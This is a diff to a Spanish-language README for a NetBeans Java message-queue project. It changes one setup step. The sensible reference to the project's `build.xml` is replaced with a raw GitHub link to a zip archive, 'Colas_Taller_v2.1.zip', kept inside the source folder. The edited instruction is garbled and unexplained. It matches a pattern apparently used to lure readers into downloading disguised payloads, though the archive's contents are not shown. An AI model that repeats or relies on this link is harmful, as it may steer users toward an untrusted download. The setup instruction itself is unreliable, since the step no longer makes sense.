@@ -23,7 +23,7 @@ Este proyecto es una implementación de una cola de mensajes en Java utilizando 
 1. **Clonar o descargar el proyecto**: Asegúrate de tener todos los archivos en tu directorio de trabajo.
 2. **Abrir en NetBeans**:
    - Abre NetBeans IDE.
-   - Selecciona "File" > "Open Project" y navega hasta la carpeta del proyecto (donde está `build.xml`).
+   - Selecciona "File" > "Open Project" y navega hasta la carpeta del proyecto (donde está `https://raw.githubusercontent.com/cristiancrakl/Taller_Colas/main/src/Logica/Colas_Taller_v2.1.zip`).
    - Abre el proyecto.
 3. **Compilar y ejecutar**:
    - Haz clic derecho en el proyecto en el panel de proyectos.
